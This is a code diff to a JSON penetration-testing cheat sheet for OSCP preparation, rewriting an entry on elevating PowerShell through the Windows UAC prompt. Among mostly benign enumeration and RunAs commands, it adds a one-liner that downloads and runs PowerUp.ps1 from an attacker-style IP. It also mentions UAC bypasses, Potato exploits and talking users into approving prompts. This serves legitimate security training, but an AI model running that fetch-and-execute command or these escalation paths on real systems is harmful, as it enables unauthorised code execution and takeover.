@@ -1,30 +1,30 @@
 {
   "cheatsheets": [
     {
-      "id": "oscp-oneliners-collection",
-      "name": "OSCP One-Liners - Essential Command Collection",
-      "description": "Curated collection of single-line commands for rapid OSCP exploitation and enumeration. Organized by category for quick reference during exam scenarios.",
-      "category": "utilities",
-      "oscp_relevance": "high",
+      "id": "windows-uac-elevation",
+      "name": "Windows UAC Elevation One-Liners",
+      "description": "One-liner commands for launching elevated PowerShell sessions via Start-Process -Verb RunAs. Requires GUI access (RDP/physical console).",
+      "category": "one-liners",
+      "oscp_relevance": "low",
       "educational_header": {
         "how_to_recognize": [
-          "Need quick command without complex syntax or multiple steps",
-          "Time-sensitive situation requiring immediate execution",
-          "Copy-paste scenario where multi-line commands are impractical",
-          "Restricted shell where command chaining is easier than scripting"
+          "You have RDP or physical console access to Windows target",
+          "User is in local Administrators group but running Medium integrity",
+          "Need to test UAC configuration before attempting bypass techniques",
+          "Interactive GUI session available for manual UAC prompt approval"
         ],
         "when_to_look_for": [
-          "During OSCP exam when every second counts",
-          "When you need to quickly test a technique",
-          "In reverse shells where you can't upload scripts",
-          "When pivoting through multiple systems rapidly"
+          "Internal penetration testing with RDP access",
+          "Testing UAC configuration behavior on target systems",
+          "Social engineering scenarios where user can approve UAC prompt",
+          "Lab environments where interactive access is available"
         ]
       },
       "scenarios": [
         {
           "title": "Scenario: Quick PowerShell Elevation Test (RDP Access)",
           "context": "You have RDP access to a Windows target as a user who is in the local Administrators group. You need to quickly test if you can elevate to High integrity without using UAC bypass techniques. You want to verify the UAC prompt behavior before attempting automation.",
-          "approach": "Phase 1: Verify User Context (30 seconds)\n- Check if user in Administrators group: net localgroup administrators\n- Check current integrity level: whoami /groups | findstr 'Mandatory'\n- Verify UAC enabled: reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA\n\nPhase 2: Test Manual Elevation (1 minute)\n- Use powershell-runas-basic to open elevated shell\n- User clicks 'Yes' on UAC prompt (if appears)\n- Verify High integrity in new window\n\nPhase 3: Determine Next Steps (30 seconds)\n- If UAC prompt appeared and worked → User can manually elevate\n- If no prompt (UAC disabled) → User already has full admin rights\n- If prompt but denied → Need UAC bypass technique instead",
+          "approach": "Phase 1: Verify User Context (30 seconds)\n- Check if user in Administrators group: net localgroup administrators\n- Check current integrity level: whoami /groups | findstr 'Mandatory'\n- Verify UAC enabled: reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA\n\nPhase 2: Test Manual Elevation (1 minute)\n- Use powershell-runas-basic to open elevated shell\n- User clicks 'Yes' on UAC prompt (if appears)\n- Verify High integrity in new window\n\nPhase 3: Determine Next Steps (30 seconds)\n- If UAC prompt appeared and worked -> User can manually elevate\n- If no prompt (UAC disabled) -> User already has full admin rights\n- If prompt but denied -> Need UAC bypass technique instead",
           "commands": [
             "powershell-runas-basic",
             "powershell-runas-keepopen"
@@ -58,22 +58,39 @@
           "title": "Windows PowerShell - Manual UAC Elevation",
           "notes": "One-liner commands for launching elevated PowerShell sessions via Start-Process -Verb RunAs.\n\nIMPORTANT LIMITATIONS:\n- Requires GUI access (RDP, physical console)\n- User must click UAC prompt manually\n- NOT suitable for reverse shells or automated exploitation\n- OSCP exam relevance: LOW (no GUI interaction possible)\n\nWHEN TO USE:\n- Internal penetration testing with RDP access\n- Testing UAC configuration behavior\n- Legitimate administrative tasks on controlled systems\n- Social engineering scenarios (convince user to approve)\n\nWHEN NOT TO USE (OSCP EXAM):\n- Reverse shells from web exploits\n- WinRM/SSH remote sessions (non-interactive)\n- Automated exploitation requiring no user interaction\n- Any scenario requiring stealth (UAC prompts are visible)\n\nBETTER ALTERNATIVES FOR OSCP:\n- UAC bypass techniques (fodhelper, eventvwr) - No prompt required\n- Service exploitation - Escalate without user interaction\n- Token impersonation (Potato exploits) - If SeImpersonate available\n- Credential reuse (runas /savecred) - If admin credentials cached",
           "commands": [
-            "powershell-runas-basic",
-            "powershell-runas-output-redirect",
-            "powershell-runas-keepopen",
-            "powershell-runas-download-execute"
+            {
+              "id": "powershell-runas-basic",
+              "example": "powershell -Command \"Start-Process powershell -Verb RunAs\"",
+              "shows": "UAC prompt appears asking for admin consent"
+            },
+            {
+              "id": "powershell-runas-output-redirect",
+              "example": "powershell -Command \"Start-Process powershell -Verb RunAs -ArgumentList '-Command','Get-Process > C:\\temp\\output.txt'\"",
+              "shows": "UAC prompt appears and user clicks 'Yes'"
+            },
+            {
+              "id": "powershell-runas-keepopen",
+              "example": "powershell -Command \"Start-Process powershell -Verb RunAs -ArgumentList '-NoExit','-Command','cd C:\\\\'\"",
+              "shows": "UAC prompt appears and user clicks 'Yes'"
+            },
+            {
+              "id": "powershell-runas-download-execute",
+              "example": "powershell -Command \"Start-Process powershell -Verb RunAs -ArgumentList '-NoExit','-Command','IEX(New-Object Net.WebClient).DownloadString(\\\"http://10.10.14.5/PowerUp.ps1\\\")\\\"'\"",
+              "shows": "UAC prompt appears (user must click 'Yes')"
+            }
           ]
         }
       ],
       "tags": [
         "ONE_LINER",
-        "OSCP",
-        "QUICK_REFERENCE",
-        "POWERSHELL",
+        "OSCP:LOW",
         "WINDOWS",
+        "POWERSHELL",
         "UAC",
         "ELEVATION",
-        "UTILITIES"
+        "PRIVILEGE_ESCALATION",
+        "RDP",
+        "QUICK_REFERENCE"
       ]
     }
   ]
